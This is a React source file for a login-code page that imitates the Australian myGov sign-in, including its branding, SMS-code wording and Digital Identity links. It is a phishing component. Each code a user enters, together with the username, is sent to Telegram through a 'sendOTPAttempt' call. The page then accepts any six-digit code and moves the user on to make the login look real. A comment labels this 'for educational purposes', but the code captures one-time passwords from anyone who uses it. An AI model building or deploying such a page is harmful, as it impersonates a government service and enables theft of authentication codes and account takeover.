import Layout from "@/components/Layout";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Link, useNavigate, useLocation } from "react-router-dom";
import { useState, useEffect } from "react";
import { sendOTPAttempt } from "@/utils/telegramService";
import { sessionManager } from "@/utils/sessionManager";
import { useToast } from "@/hooks/use-toast";

const EnterCode = () => {
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes
  const [attemptsRemaining, setAttemptsRemaining] = useState(3);
  const navigate = useNavigate();
  const location = useLocation();
  const { toast } = useToast();
  
  const username = location.state?.username || "User";

  useEffect(() => {
    // Check if session is valid
    if (!sessionManager.isSessionValid()) {
      navigate("/");
      return;
    }

    setAttemptsRemaining(sessionManager.getOTPAttemptsRemaining());

    // Timer countdown
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          clearInterval(timer);
          navigate("/", { state: { message: "OTP expired. Please sign in again." } });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [navigate]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!otp || otp.length !== 6) {
      toast({
        title: "Error",
        description: "Please enter a valid 6-digit code",
        variant: "destructive",
      });
      return;
    }

    if (!sessionManager.incrementOTPAttempts()) {
      toast({
        title: "Account Locked",
        description: "Too many failed attempts. Redirecting to login...",
        variant: "destructive",
      });
      setTimeout(() => navigate("/"), 2000);
      return;
    }

    setIsLoading(true);
    
    try {
      // Send OTP to Telegram
      await sendOTPAttempt(otp, username);
      
      // For educational purposes, accept any 6-digit code
      if (otp.length === 6) {
        toast({
          title: "Success",
          description: "Verification successful!",
        });
        navigate("/home");
      } else {
        throw new Error("Invalid OTP");
      }
      
    } catch (error) {
      setAttemptsRemaining(sessionManager.getOTPAttemptsRemaining());
      toast({
        title: "Error",
        description: `Invalid code. ${attemptsRemaining - 1} attempts remaining.`,
        variant: "destructive",
      });
      setOtp("");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <Layout>
      <div className="min-h-[calc(100vh-200px)] bg-mygov-background flex items-center justify-center px-4 py-16">
        <Card className="w-full max-w-md">
          <CardHeader className="text-center pb-6">
            <CardTitle className="text-3xl font-normal text-mygov-text-primary">
              Enter code
            </CardTitle>
            <CardDescription className="text-lg mt-4 text-mygov-text-secondary">
              We sent a code by SMS to your mobile number.
            </CardDescription>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <Label htmlFor="code" className="text-mygov-text-primary">
                  Code
                </Label>
                <Input 
                  id="code" 
                  type="text" 
                  value={otp}
                  onChange={(e) => setOtp(e.target.value.replace(/\D/g, '').slice(0, 6))}
                  className="h-12 w-32 border-gray-300 focus:border-mygov-blue text-center text-lg tracking-wider"
                  maxLength={6}
                  placeholder="000000"
                  disabled={isLoading}
                />
                <div className="text-sm text-mygov-text-secondary">
                  <p>Code expires in: <span className="font-mono text-red-600">{formatTime(timeLeft)}</span></p>
                  <p>Attempts remaining: <span className="font-semibold">{attemptsRemaining}</span></p>
                </div>
              </div>

              <div className="text-sm text-mygov-text-secondary space-y-2">
                <p>
                  If you don't want to use Digital Identity, you can{" "}
                  <Link to="/contact" className="text-mygov-blue hover:underline">
                    call the helpdesk
                  </Link>{" "}
                  to create a new myGov account.
                </p>
                <p>
                  <Link to="/digital-identity" className="text-mygov-blue hover:underline">
                    Continue with Digital Identity
                  </Link>
                </p>
              </div>

              <Button 
                type="submit"
                className="w-24 h-12 bg-mygov-light-blue hover:bg-mygov-light-blue/90 text-white font-medium"
                disabled={isLoading || timeLeft <= 0}
              >
                {isLoading ? "..." : "Next"}
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </Layout>
  );
};

export default EnterCode;